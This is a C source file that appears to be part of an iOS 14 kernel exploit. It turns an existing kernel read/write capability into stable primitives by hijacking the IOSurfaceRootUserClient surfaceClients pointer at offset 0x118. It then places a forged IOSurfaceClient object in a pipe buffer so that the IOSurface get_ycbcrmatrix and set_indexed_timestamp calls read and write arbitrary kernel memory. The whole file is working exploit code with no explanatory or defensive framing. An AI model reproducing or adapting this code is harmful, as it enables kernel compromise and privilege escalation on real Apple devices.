#include <stdio.h>
#include <stdint.h>
#include "kprimitive.h"
#include "main.h"
#include "IOSurfaceRoot.h"
#include "offsets.h"
#include "krw.h"
#include "kutils.h"
#include "find_port.h"

extern io_connect_t IOSurfaceRootUserClient;
extern uint64_t IOSurfaceRootUserClient_addr;

extern int *pipefds;
extern uint8_t *pipe_buffer;

extern size_t pipe_buffer_size;

uint64_t pipe_base = 0;

void read_pipe()
{
    size_t read_size = pipe_buffer_size - 1;
    read(pipefds[0], pipe_buffer, read_size);
    // printf("pipe_buffer = %s\n", pipe_buffer)
}

void write_pipe()
{
    size_t write_size = pipe_buffer_size - 1;
    write(pipefds[1], pipe_buffer, write_size);
}

uint64_t surfaceClients = 0;
void build_stable_kmem_api()
{
    uint64_t p_fd = kread64(proc_of_pid(getpid()) + off_p_pfd); //kapi_read_kptr(proc_of_pid(getpid()) + OFFSET(proc, p_fd));
    uint64_t fd_ofiles = kread64(p_fd); //kptr_t fd_ofiles = kapi_read_kptr(p_fd + OFFSET(filedesc, fd_ofiles));
    uint64_t rpipe_fp = kread64(fd_ofiles + pipefds[0] * 8); //kapi_read_kptr(fd_ofiles + sizeof(kptr_t) * pipefds[0]);
    uint64_t fp_glob = kread64(rpipe_fp + off_fp_fglob); //kapi_read_kptr(rpipe_fp + OFFSET(fileproc, fp_glob));
    uint64_t rpipe = kread64(fp_glob + off_fg_data); //kapi_read_kptr(fp_glob + OFFSET(fileglob, fg_data));
    pipe_base = kread64(rpipe + off_pb_buffer); //kapi_read_kptr(rpipe + OFFSET(pipe, buffer));

	// XXX dirty hack, but I'm lucky :)
	// OFFSET(IOSurfaceRootUserClient, surfaceClients) = 0x118;
    // uint8_t bytes[20];
    // read_20(IOSurfaceRootUserClient_addr + 0x118 - 4, bytes);
    // *(uint64_t *)(bytes + 4) = pipe_base;
    // write_20(IOSurfaceRootUserClient_addr + 0x118 - 4, bytes);

	// khexdump(IOSurfaceRootUserClient_addr + 0x118 - 4, 20);

	surfaceClients = kread64(IOSurfaceRootUserClient_addr + 0x118);
	printf("surfaceClients = 0x%llx\n", surfaceClients);

	kwrite64(IOSurfaceRootUserClient_addr + 0x118, pipe_base);
}

void clean_stable_kmem_api()
{
    kwrite64(IOSurfaceRootUserClient_addr + 0x118, surfaceClients);
}

// iOS 14.x only
struct fake_client {
    uint64_t pad_00; // can not use IOSurface 0 now
    uint64_t uc_obj;
    uint8_t pad_10[0x40]; // start of IOSurfaceClient obj
    uint64_t surf_obj;
    uint8_t pad_58[0x360 - 0x58];
    uint64_t shared_RW;
};

uint32_t kpri_read32(uint64_t where) {
    struct fake_client *p = (void *)pipe_buffer;
    p->uc_obj = pipe_base + 0x10;
    p->surf_obj = where - 0xb4;
    write_pipe();
    uint32_t v = iosurface_s_get_ycbcrmatrix();
    read_pipe();
    return v;
};

void kpri_write64(uint64_t where, uint64_t what) {
    struct fake_client *p = (void *)pipe_buffer;
    p->uc_obj = pipe_base + 0x10;
    p->surf_obj = pipe_base;
    p->shared_RW = where;
    write_pipe();
    iosurface_s_set_indexed_timestamp(what);
    read_pipe();
};